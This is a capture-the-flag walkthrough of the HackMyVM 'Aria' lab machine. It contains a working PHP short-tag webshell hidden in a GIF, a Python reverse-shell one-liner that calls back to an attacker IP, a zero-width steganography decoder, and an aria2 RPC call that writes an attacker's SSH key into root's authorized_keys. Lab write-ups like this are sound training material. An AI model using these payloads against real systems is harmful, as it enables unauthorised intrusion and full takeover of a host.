HackMyVm - Aria Machine Walkthrough
Machine Info
Name: Aria

Difficulty: Easy

IP: 192.168.56.214

OS: Debian 11 (based on OpenSSH 8.4p1)

Reconnaissance
Port Scanning
We begin with a full TCP port scan using nmap:

bash
nmap -p- -sV -sC -T4 192.168.56.214
Results:

text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.62 ((Debian))
1337/tcp open  waste?     Aria Debug Shell (custom)
The service on port 1337 responds with a banner: --- Aria Debug Shell --- and a $ prompt.

Enumeration
Web Application (Port 80)
Visiting http://192.168.56.214 shows a page titled "Ultra-Secure Naming" with a description:

Generates unpredictable file paths using md5(time()·rand(1,1000))

Only accepts .gif, .jpg, .png files ≤ 1 MB

Content must not contain <?php

A file upload form is available at /upload.php.

Debug Shell (Port 1337)
Connecting with netcat gives a restricted shell:

bash
nc -vn 192.168.56.214 1337
Output:

text
--- Aria Debug Shell ---
--- Type 'exit' to quit ---

$ help
Command not found: help
$ show
You're close! Try a command related to revealing paths.
$ showpath
--- Upload Paths ---
...
The command showpath reveals the upload path for files submitted via the web form.

Initial Foothold
Bypassing Upload Filters
The web application claims to block files containing <?php. However, we can use PHP short tags or alternative syntax that doesn't include <?php.

Create a malicious GIF file with embedded PHP code:

bash
echo 'GIF819a' > poison.gif
echo '<?= exec($_GET[0]); ?>' >> poison.gif
Upload poison.gif via the web form. The application returns a success message and a link to the uploaded file:

text
http://aria.hmv/uploads/826bbbb383e3da5944f83f0572abb436.gif
Code Execution
We can now execute commands via the 0 parameter:

text
http://aria.hmv/uploads/826bbbb383e3da5944f83f0572abb436.gif?0=id
Response:

text
GIF819a
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Reverse Shell
Use Python to spawn a reverse shell:

bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.56.106",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
On our listener:

bash
nc -lvnp 4444
We receive a connection as www-data.

User Flag
User Enumeration
Navigate to the home directory:

bash
cd /home/aria
ls -la
We find user.txt. Using cat shows the flag but with invisible trailing characters:

text
www-data@Aria:/home/aria$ cat user.txt
flag{user-d13adadc6bbc1391394a5198cba2d1d7}
A hex dump reveals extra bytes:

bash
xxd user.txt
Output (truncated):

text
00000000: 666c 6167 7b75 7365 722d 6431 3361 6461  flag{user-d13ada
00000010: 6463 3662 6263 3133 3931 3339 3461 3531  dc6bbc1391394a51
00000020: 3938 6362 6132 6431 6437 7d0a e280 8be2  98cba2d1d7}.....
After the newline (0a), we see sequences like e2 80 8b and e2 80 8c. These are Zero-Width Characters:

U+200B (ZERO WIDTH SPACE) → e2 80 8b

U+200C (ZERO WIDTH NON-JOINER) → e2 80 8c

Decoding Zero-Width Steganography
This technique encodes binary data using invisible Unicode characters. The sequence in user.txt likely contains a secret token.

We can extract and decode it with a simple Python script:

python
with open('user.txt', 'rb') as f:
    data = f.read()

# Find the start of zero-width sequence after the newline
idx = data.index(b'\n') + 1
zw_bytes = data[idx:]

# Convert UTF-8 zero-width chars to bits
bits = []
i = 0
while i < len(zw_bytes):
    if zw_bytes[i:i+3] == b'\xe2\x80\x8b':  # U+200B
        bits.append('0')
        i += 3
    elif zw_bytes[i:i+3] == b'\xe2\x80\x8c': # U+200C
        bits.append('1')
        i += 3
    else:
        break

# Group bits into bytes and decode ASCII
bit_str = ''.join(bits)
secret = ''
for j in range(0, len(bit_str), 8):
    byte = bit_str[j:j+8]
    if len(byte) == 8:
        secret += chr(int(byte, 2))

print(secret)
Running this reveals: token:maze-sec

This token will be crucial for privilege escalation.

Privilege Escalation
Internal Service Discovery
Check listening ports:

bash
ss -tulnp | grep LISTEN
Notice port 6800 bound to 127.0.0.1 only.

Identify the process:

bash
ps aux | grep 6800
Output:

text
root   /usr/bin/aria2c --conf-path=/root/.aria2/aria2.conf
Aria2 is a command-line download utility with an RPC interface. It runs as root on this machine.

Exploiting Aria2 RPC
Aria2 RPC listens on /jsonrpc endpoint. Attempting to call methods without a token fails:

bash
curl -X POST -d '{"jsonrpc":"2.0","method":"aria2.getVersion","id":"1"}' http://127.0.0.1:6800/jsonrpc
# Response: {"error":{"message":"Unauthorized"}}
The token we decoded from user.txt is maze-sec. We can use it to interact with the RPC.

Writing Root SSH Key
On our attacker machine, generate an SSH key pair:

bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/aria_root
Start an HTTP server to serve the public key:

bash
cd ~/.ssh
python3 -m http.server 80
From the target's shell, use Aria2 to download the public key directly into /root/.ssh/authorized_keys:

bash
curl -X POST http://127.0.0.1:6800/jsonrpc \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc": "2.0",
    "id": "1",
    "method": "aria2.addUri",
    "params": [
      "token:maze-sec",
      ["http://192.168.56.106/aria_root.pub"],
      {
        "dir": "/root/.ssh",
        "out": "authorized_keys"
      }
    ]
  }'
If successful, the RPC returns a result GID.

SSH as Root
Connect via SSH using the private key:

bash
ssh -i ~/.ssh/aria_root root@192.168.56.214
We are now root:

text
root@Aria:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Aria:~# cat /root/root.txt
flag{root-[REDACTED]}
Conclusion
This machine demonstrated:

Bypassing weak file upload filters with PHP short tags.

Using zero-width steganography to hide sensitive data in plain text.

Exploiting a misconfigured Aria2 RPC service running as root to write an SSH key and escalate privileges.
